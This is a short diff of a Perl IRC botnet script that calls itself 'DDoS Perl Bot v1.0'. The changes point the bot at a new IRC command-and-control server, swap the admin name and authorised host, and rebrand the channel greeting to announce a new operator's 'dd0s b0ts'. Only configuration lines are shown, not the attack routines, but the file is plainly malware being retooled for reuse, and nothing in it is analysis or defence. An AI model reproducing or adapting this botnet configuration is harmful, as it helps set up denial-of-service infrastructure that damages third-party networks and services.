@@ -132,7 +132,8 @@ chop (my $realname = $rircname[rand scalar @rircname]);
  
 my $nick =$rircname[rand scalar @rircname];
 
-$server = '51.72.249.177' unless $server;
+
+$server = 'irc.dal.net' unless $server;
 my $port = '6667';
  
 my $linas_max='8';
@@ -141,8 +142,8 @@ my $sleep='5';
 my $homedir = "/tmp";
 my $version = 'DDoS Perl Bot v1.0';
  
-my @admins = ("lilmoe");
-my @hostauth = ("lilmoe.me");
+my @admins = ("moe");
+my @hostauth = ("lilmoe.store");
 my @channels = ("#dew");
  
 my $pacotes = 1;
@@ -369,7 +370,7 @@ elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
   foreach my $canal (@channels) {
         sendraw("MODE $nick +x");
     sendraw("JOIN $canal");
-        sendraw("PRIVMSG $canal :4,1 [lilmoe's dd0s b0ts] 9,1Lets DDOSSSS!... ");
+        sendraw("PRIVMSG $canal :4,1 [alavojda's dd0s b0ts] 9,1Lets DDOSSSS!... ");
 }
 }
 }
